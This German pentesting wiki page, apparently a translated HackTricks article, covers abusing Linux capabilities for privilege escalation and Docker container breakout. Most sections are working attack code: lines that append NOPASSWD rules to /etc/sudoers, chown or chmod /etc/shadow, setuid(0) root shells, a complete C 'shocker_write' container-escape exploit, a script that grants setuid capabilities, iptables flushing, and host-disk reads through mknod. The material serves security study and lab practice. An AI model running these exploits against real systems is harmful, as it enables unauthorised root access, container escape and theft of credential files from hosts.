​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) ist die relevanteste Cybersicherheitsveranstaltung in **Spanien** und eine der wichtigsten in **Europa**. Mit **der Mission, technisches Wissen zu fördern**, ist dieser Kongress ein brodelnder Treffpunkt für Technologie- und Cybersicherheitsprofis in jeder Disziplin.

{% embed url="https://www.rootedcon.com/" %}

## CAP\_DAC\_OVERRIDE

**Dies bedeutet, dass Sie die Schreibberechtigungsprüfungen für jede Datei umgehen können, sodass Sie jede Datei schreiben können.**

Es gibt viele Dateien, die Sie **überschreiben können, um Privilegien zu eskalieren,** [**hier können Sie Ideen bekommen**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Beispiel mit Binärdatei**

In diesem Beispiel hat vim diese Fähigkeit, sodass Sie jede Datei wie _passwd_, _sudoers_ oder _shadow_ ändern können:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Beispiel mit Binärdatei 2**

In diesem Beispiel wird die Binärdatei **`python`** diese Fähigkeit haben. Sie könnten Python verwenden, um jede Datei zu überschreiben:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**Beispiel mit Umgebung + CAP_DAC_READ_SEARCH (Docker-Ausbruch)**

Sie können die aktivierten Fähigkeiten innerhalb des Docker-Containers mit folgendem Befehl überprüfen:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Zunächst lesen Sie den vorherigen Abschnitt, der die Fähigkeit **DAC\_READ\_SEARCH missbraucht, um beliebige Dateien** des Hosts zu lesen, und **kompilieren** Sie den Exploit.\
Dann **kompilieren Sie die folgende Version des Shocker-Exploits**, der es Ihnen ermöglicht, **beliebige Dateien** im Dateisystem des Hosts zu schreiben:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Um aus dem Docker-Container auszubrechen, könnten Sie die Dateien `/etc/shadow` und `/etc/passwd` vom Host **herunterladen**, ihnen einen **neuen Benutzer** hinzufügen und sie mit **`shocker_write`** überschreiben. Anschließend können Sie über **ssh** darauf **zugreifen**.

**Der Code dieser Technik wurde aus dem Labor "Abusing DAC\_OVERRIDE Capability" von** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com) **kopiert.**

## CAP\_CHOWN

**Dies bedeutet, dass es möglich ist, den Besitz einer beliebigen Datei zu ändern.**

**Beispiel mit einem Binärfile**

Angenommen, das **`python`**-Binärfile hat diese Fähigkeit, dann können Sie den **Besitzer** der **shadow**-Datei **ändern**, das Root-Passwort **ändern** und Privilegien eskalieren:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
Oder mit dem **`ruby`**-Binärdatei, die diese Fähigkeit hat:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP\_FOWNER

**Dies bedeutet, dass es möglich ist, die Berechtigungen einer beliebigen Datei zu ändern.**

**Beispiel mit einer Binärdatei**

Wenn Python diese Fähigkeit hat, können Sie die Berechtigungen der Schattendatei ändern, das **Root-Passwort ändern** und Privilegien eskalieren:
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP\_SETUID

**Dies bedeutet, dass es möglich ist, die effektive Benutzer-ID des erstellten Prozesses festzulegen.**

**Beispiel mit Binärdatei**

Wenn Python diese **Fähigkeit** hat, können Sie sie sehr einfach missbrauchen, um Privilegien auf Root-Ebene zu eskalieren:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**Eine andere Möglichkeit:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP\_SETGID

**Dies bedeutet, dass es möglich ist, die effektive Gruppen-ID des erstellten Prozesses festzulegen.**

Es gibt viele Dateien, die Sie überschreiben können, um Privilegien zu eskalieren, [**hier können Sie Ideen bekommen**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Beispiel mit Binärdatei**

In diesem Fall sollten Sie nach interessanten Dateien suchen, die von einer Gruppe gelesen werden können, da Sie sich als jede Gruppe ausgeben können:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
Sobald Sie eine Datei gefunden haben, die Sie missbrauchen können (durch Lesen oder Schreiben), um Privilegien zu eskalieren, können Sie **eine Shell erhalten, indem Sie sich als interessante Gruppe ausgeben** mit:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
In diesem Fall wurde die Gruppe "shadow" impersoniert, um die Datei `/etc/shadow` zu lesen:
```bash
cat /etc/shadow
```
Wenn **Docker** installiert ist, könnten Sie die **Docker-Gruppe** **imitieren** und sie missbrauchen, um mit dem [**Docker-Socket zu kommunizieren und Privilegien zu eskalieren**](./#writable-docker-socket).

## CAP\_SETFCAP

**Dies bedeutet, dass es möglich ist, Fähigkeiten auf Dateien und Prozessen zu setzen**

**Beispiel mit Binärdatei**

Wenn Python diese **Fähigkeit** hat, können Sie sie sehr einfach missbrauchen, um Privilegien auf Root-Ebene zu eskalieren:

{% code title="setcapability.py" %}
```python
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```
{% endcode %}
```bash
python setcapability.py /usr/bin/python2.7
```
{% hint style="warning" %}
Beachten Sie, dass Sie diese Berechtigung verlieren, wenn Sie eine neue Berechtigung mit CAP\_SETFCAP für die Binärdatei festlegen.
{% endhint %}

Sobald Sie die [SETUID-Berechtigung](linux-capabilities.md#cap\_setuid) haben, können Sie in den entsprechenden Abschnitt gehen, um zu sehen, wie Sie Privilegien eskalieren können.

**Beispiel mit Umgebung (Docker-Ausbruch)**

Standardmäßig wird dem Prozess innerhalb des Containers in Docker die Berechtigung **CAP\_SETFCAP** zugewiesen. Sie können dies überprüfen, indem Sie Folgendes tun:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
Diese Fähigkeit ermöglicht es, Binärdateien **beliebige andere Fähigkeiten zu geben**, sodass wir überlegen könnten, aus dem Container **auszubrechen**, indem wir eine der anderen Fähigkeiten nutzen, die auf dieser Seite erwähnt werden.\
Wenn Sie jedoch versuchen, beispielsweise die Fähigkeiten CAP\_SYS\_ADMIN und CAP\_SYS\_PTRACE der gdb-Binärdatei zu geben, werden Sie feststellen, dass Sie sie zwar geben können, aber die **Binärdatei danach nicht mehr ausgeführt werden kann**:
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
[Aus den Dokumenten](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Permitted: Dies ist eine **einschränkende Obermenge für die effektiven Fähigkeiten**, die der Thread annehmen kann. Es ist auch eine einschränkende Obermenge für die Fähigkeiten, die von einem Thread zur vererbten Menge hinzugefügt werden können, der **nicht die CAP\_SETPCAP-Fähigkeit** in seiner effektiven Menge hat._\
Es scheint, dass die erlaubten Fähigkeiten diejenigen begrenzen, die verwendet werden können.\
Allerdings gewährt Docker standardmäßig auch die **CAP\_SETPCAP**, sodass Sie möglicherweise **neue Fähigkeiten in die vererbbaren Fähigkeiten einstellen** können.\
In der Dokumentation dieser Fähigkeit heißt es jedoch: _CAP\_SETPCAP: \[…] **Fügt der vererbbaren Menge jede Fähigkeit aus der begrenzenden Menge des aufrufenden Threads hinzu**_.\
Es scheint, dass wir nur Fähigkeiten aus der begrenzenden Menge zur vererbbaren Menge hinzufügen können. Das bedeutet, dass **wir keine neuen Fähigkeiten wie CAP\_SYS\_ADMIN oder CAP\_SYS\_PTRACE in die vererbbare Menge aufnehmen können, um Privilegien zu eskalieren**.

## CAP\_SYS\_RAWIO

[**CAP\_SYS\_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) ermöglicht eine Reihe sensibler Operationen, einschließlich des Zugriffs auf `/dev/mem`, `/dev/kmem` oder `/proc/kcore`, der Modifikation von `mmap_min_addr`, des Zugriffs auf die Systemaufrufe `ioperm(2)` und `iopl(2)` sowie verschiedener Festplattenbefehle. Über diese Fähigkeit wird auch das `FIBMAP ioctl(2)` aktiviert, was in der [Vergangenheit](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html) zu Problemen geführt hat. Laut der Manpage ermöglicht dies auch dem Inhaber, **eine Reihe gerätespezifischer Operationen an anderen Geräten durchzuführen**.

Dies kann für **Privilegien-Eskalation** und **Docker-Ausbruch** nützlich sein.

## CAP\_KILL

**Dies bedeutet, dass es möglich ist, jeden Prozess zu beenden.**

**Beispiel mit einer ausführbaren Datei**

Nehmen wir an, die **`python`**-Binärdatei hat diese Fähigkeit. Wenn Sie auch einige Dienst- oder Socket-Konfigurationen (oder eine beliebige Konfigurationsdatei im Zusammenhang mit einem Dienst) ändern könnten, könnten Sie eine Hintertür einbauen und dann den Prozess im Zusammenhang mit diesem Dienst beenden und auf die Ausführung der neuen Konfigurationsdatei mit Ihrer Hintertür warten.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privesc mit kill**

Wenn Sie über Kill-Berechtigungen verfügen und ein **Node-Programm als Root** (oder als anderer Benutzer) ausgeführt wird, können Sie wahrscheinlich **das Signal SIGUSR1** an das Programm **senden** und es dazu bringen, den Node-Debugger zu **öffnen**, mit dem Sie eine Verbindung herstellen können.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% content-ref url="electron-cef-chromium-debugger-abuse.md" %}
[electron-cef-chromium-debugger-abuse.md](electron-cef-chromium-debugger-abuse.md)
{% endcontent-ref %}

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) ist die relevanteste Cybersicherheitsveranstaltung in **Spanien** und eine der wichtigsten in **Europa**. Mit **dem Ziel, technisches Wissen zu fördern**, ist dieser Kongress ein brodelnder Treffpunkt für Technologie- und Cybersicherheitsprofis in jeder Disziplin.

{% embed url="https://www.rootedcon.com/" %}

## CAP\_NET\_BIND\_SERVICE

**Dies bedeutet, dass es möglich ist, auf jedem Port zuzuhören (auch auf privilegierten Ports).** Sie können die Berechtigungen nicht direkt mit dieser Fähigkeit eskalieren.

**Beispiel mit Binärdatei**

Wenn **`python`** diese Fähigkeit hat, kann es auf jedem Port zuhören und sogar von diesem Port aus eine Verbindung zu einem anderen Port herstellen (einige Dienste erfordern Verbindungen von bestimmten privilegierten Ports).

{% tabs %}
{% tab title="Zuhören" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{% endtab %}

{% tab title="Verbinden" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{% endtab %}
{% endtabs %}

## CAP\_NET\_RAW

Die Fähigkeit **CAP\_NET\_RAW** ermöglicht es Prozessen, **RAW- und PACKET-Sockets zu erstellen**, mit denen sie beliebige Netzwerkpakete generieren und senden können. Dies kann zu Sicherheitsrisiken in containerisierten Umgebungen führen, wie z.B. Paket-Spoofing, Traffic-Injektion und Umgehung von Netzwerkzugriffskontrollen. Bösartige Akteure könnten dies ausnutzen, um die Container-Routing zu stören oder die Netzwerksicherheit des Hosts zu kompromittieren, insbesondere ohne ausreichenden Firewall-Schutz. Darüber hinaus ist **CAP_NET_RAW** für privilegierte Container wichtig, um Operationen wie das Pingen über RAW ICMP-Anfragen zu unterstützen.

**Dies bedeutet, dass es möglich ist, den Datenverkehr abzufangen.** Mit dieser Fähigkeit können Sie die Berechtigungen jedoch nicht direkt eskalieren.

**Beispiel mit einer ausführbaren Datei**

Wenn die ausführbare Datei **`tcpdump`** diese Fähigkeit hat, können Sie sie verwenden, um Netzwerkinformationen zu erfassen.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
Beachten Sie, dass wenn die **Umgebung** diese Fähigkeit bereitstellt, können Sie auch **`tcpdump`** verwenden, um den Datenverkehr abzufangen.

**Beispiel mit Binärdatei 2**

Das folgende Beispiel ist ein **`python2`**-Code, der nützlich sein kann, um den Datenverkehr der "**lo**" (**localhost**) Schnittstelle abzufangen. Der Code stammt aus dem Labor "_The Basics: CAP-NET\_BIND + NET\_RAW_" von [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP\_NET\_ADMIN + CAP\_NET\_RAW

Die Fähigkeit [**CAP\_NET\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) ermöglicht es dem Inhaber, Netzwerkkonfigurationen zu ändern, einschließlich Firewall-Einstellungen, Routing-Tabellen, Socket-Berechtigungen und Netzwerkschnittstelleneinstellungen innerhalb der freigegebenen Netzwerknamensräume. Sie ermöglicht auch das Aktivieren des **Promiscuous-Modus** auf Netzwerkschnittstellen, was das Mitschneiden von Paketen über Namensräume hinweg ermöglicht.

**Beispiel mit einer ausführbaren Datei**

Angenommen, die **Python-Datei** hat diese Fähigkeiten.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP\_LINUX\_IMMUTABLE

**Dies bedeutet, dass es möglich ist, Inode-Attribute zu ändern.** Mit dieser Fähigkeit können Sie die Privilegien nicht direkt eskalieren.

**Beispiel mit Binärdatei**

Wenn Sie feststellen, dass eine Datei unveränderlich ist und Python diese Fähigkeit hat, können Sie **das unveränderliche Attribut entfernen und die Datei änderbar machen:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
{% hint style="info" %}
Beachten Sie, dass normalerweise dieses unveränderliche Attribut mit folgenden Befehlen gesetzt und entfernt wird:
```bash
sudo chattr +i file.txt
sudo chattr -i file.txt
```
{% endhint %}

## CAP\_SYS\_CHROOT

[**CAP\_SYS\_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) ermöglicht die Ausführung des `chroot(2)`-Systemaufrufs, der potenziell das Entkommen aus `chroot(2)`-Umgebungen durch bekannte Schwachstellen ermöglichen kann:

* [Wie man aus verschiedenen Chroot-Lösungen ausbricht](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf)
* [chw00t: Chroot-Escape-Tool](https://github.com/earthquake/chw00t/)

## CAP\_SYS\_BOOT

[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) ermöglicht nicht nur die Ausführung des `reboot(2)`-Systemaufrufs für Systemneustarts, einschließlich spezifischer Befehle wie `LINUX_REBOOT_CMD_RESTART2`, die für bestimmte Hardwareplattformen angepasst sind, sondern ermöglicht auch die Verwendung von `kexec_load(2)` und ab Linux 3.17 `kexec_file_load(2)` zum Laden neuer oder signierter Crash-Kernel.

## CAP\_SYSLOG

[**CAP\_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) wurde in Linux 2.6.37 von **CAP_SYS_ADMIN** getrennt und gewährt speziell die Möglichkeit, den `syslog(2)`-Aufruf zu verwenden. Diese Fähigkeit ermöglicht das Anzeigen von Kerneladressen über `/proc` und ähnliche Schnittstellen, wenn die Einstellung `kptr_restrict` auf 1 gesetzt ist, die die Offenlegung von Kerneladressen steuert. Seit Linux 2.6.39 ist der Standardwert für `kptr_restrict` 0, was bedeutet, dass Kerneladressen offengelegt werden, obwohl viele Distributionen dies aus Sicherheitsgründen auf 1 (Adressen nur für uid 0 anzeigen) oder 2 (Adressen immer verbergen) setzen.

Zusätzlich ermöglicht **CAP_SYSLOG** den Zugriff auf `dmesg`-Ausgaben, wenn `dmesg_restrict` auf 1 gesetzt ist. Trotz dieser Änderungen behält **CAP_SYS_ADMIN** aufgrund historischer Präzedenzfälle die Möglichkeit zur Durchführung von `syslog`-Operationen bei.

## CAP\_MKNOD

[**CAP\_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) erweitert die Funktionalität des `mknod`-Systemaufrufs über die Erstellung von regulären Dateien, FIFOs (benannte Pipes) oder UNIX-Domänen-Sockets hinaus. Es ermöglicht speziell die Erstellung von Spezialdateien, zu denen gehören:

- **S_IFCHR**: Zeichengeräte, wie z.B. Terminals.
- **S_IFBLK**: Blockgeräte, wie z.B. Festplatten.

Diese Fähigkeit ist für Prozesse, die die Fähigkeit zur Erstellung von Gerätedateien erfordern, unerlässlich und erleichtert die direkte Hardwareinteraktion über Zeichen- oder Blockgeräte.

Es handelt sich um eine Standard-Docker-Fähigkeit ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).

Diese Fähigkeit ermöglicht Privilege Escalations (durch vollständiges Lesen der Festplatte) auf dem Host unter folgenden Bedingungen:

1. Zugriff auf den Host (Unprivileged).
2. Zugriff auf den Container (Privileged (EUID 0) und effektives `CAP_MKNOD`).
3. Host und Container sollten denselben Benutzernamensraum teilen.

**Schritte zum Erstellen und Zugreifen auf ein Blockgerät in einem Container:**

1. **Auf dem Host als Standardbenutzer:**
- Ermitteln Sie Ihre aktuelle Benutzer-ID mit `id`, z.B. `uid=1000(standarduser)`.
- Identifizieren Sie das Zielgerät, z.B. `/dev/sdb`.

2. **Im Container als `root`:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **Zurück auf dem Host:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
Diese Methode ermöglicht es dem Standardbenutzer, über den Container auf Daten von `/dev/sdb` zuzugreifen und potenziell zu lesen, indem gemeinsam genutzte Benutzernamensräume und Berechtigungen auf dem Gerät ausgenutzt werden.


### CAP\_SETPCAP

**CAP_SETPCAP** ermöglicht es einem Prozess, die Fähigkeitssätze eines anderen Prozesses zu **ändern**, indem Fähigkeiten aus den effektiven, vererbten und erlaubten Sätzen hinzugefügt oder entfernt werden. Ein Prozess kann jedoch nur Fähigkeiten ändern, die sich in seinem eigenen erlaubten Satz befinden, um sicherzustellen, dass er die Privilegien eines anderen Prozesses nicht über seine eigenen hinaus erhöhen kann. Aktuelle Kernel-Updates haben diese Regeln verschärft und beschränken `CAP_SETPCAP` darauf, die Fähigkeiten nur in seinem eigenen oder den erlaubten Sätzen seiner Nachkommen zu verringern, um Sicherheitsrisiken zu mindern. Die Verwendung erfordert das Vorhandensein von `CAP_SETPCAP` im effektiven Satz und der Ziel-Fähigkeiten im erlaubten Satz und nutzt `capset()` für Modifikationen. Dies fasst die Kernfunktion und -beschränkungen von `CAP_SETPCAP` zusammen und hebt seine Rolle in der Privilegienverwaltung und Sicherheitsverbesserung hervor.

**`CAP_SETPCAP`** ist eine Linux-Fähigkeit, die es einem Prozess ermöglicht, die Fähigkeitssätze eines anderen Prozesses zu **ändern**. Es gewährt die Möglichkeit, Fähigkeiten aus den effektiven, vererbten und erlaubten Fähigkeitssätzen anderer Prozesse hinzuzufügen oder zu entfernen. Es gibt jedoch bestimmte Einschränkungen, wie diese Fähigkeit verwendet werden kann.

Ein Prozess mit `CAP_SETPCAP` **kann nur Fähigkeiten gewähren oder entfernen, die sich in seinem eigenen erlaubten Fähigkeitssatz befinden**. Mit anderen Worten, ein Prozess kann einer anderen Prozess keine Fähigkeit gewähren, die er selbst nicht besitzt. Diese Einschränkung verhindert, dass ein Prozess die Privilegien eines anderen Prozesses über sein eigenes Privilegieniveau hinaus erhöht.

Darüber hinaus wurde die Fähigkeit `CAP_SETPCAP` in neueren Kernel-Versionen **weiter eingeschränkt**. Sie erlaubt einem Prozess nicht mehr, die Fähigkeitssätze anderer Prozesse beliebig zu ändern. Stattdessen erlaubt sie nur einem Prozess, die Fähigkeiten in seinem eigenen erlaubten Fähigkeitssatz oder im erlaubten Fähigkeitssatz seiner Nachkommen zu verringern. Diese Änderung wurde eingeführt, um potenzielle Sicherheitsrisiken im Zusammenhang mit der Fähigkeit zu reduzieren.

Um `CAP_SETPCAP` effektiv zu nutzen, müssen Sie die Fähigkeit in Ihrem effektiven Fähigkeitssatz und die Ziel-Fähigkeiten in Ihrem erlaubten Fähigkeitssatz haben. Sie können dann den Systemaufruf `capset()` verwenden, um die Fähigkeitssätze anderer Prozesse zu ändern.

Zusammenfassend ermöglicht `CAP_SETPCAP` einem Prozess, die Fähigkeitssätze anderer Prozesse zu ändern, kann jedoch keine Fähigkeiten gewähren, die er selbst nicht besitzt. Darüber hinaus wurde seine Funktionalität aufgrund von Sicherheitsbedenken in neueren Kernel-Versionen auf die Verringerung von Fähigkeiten in seinem eigenen erlaubten Fähigkeitssatz oder den erlaubten Fähigkeitssätzen seiner Nachkommen beschränkt.

## Referenzen

**Die meisten dieser Beispiele stammen aus einigen Labors von** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com), daher empfehle ich diese Labors, um diese Privilege-Escalation-Techniken zu üben.

**Weitere Referenzen**:

* [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
* [https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/)
* [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
* [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module)
* [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

​

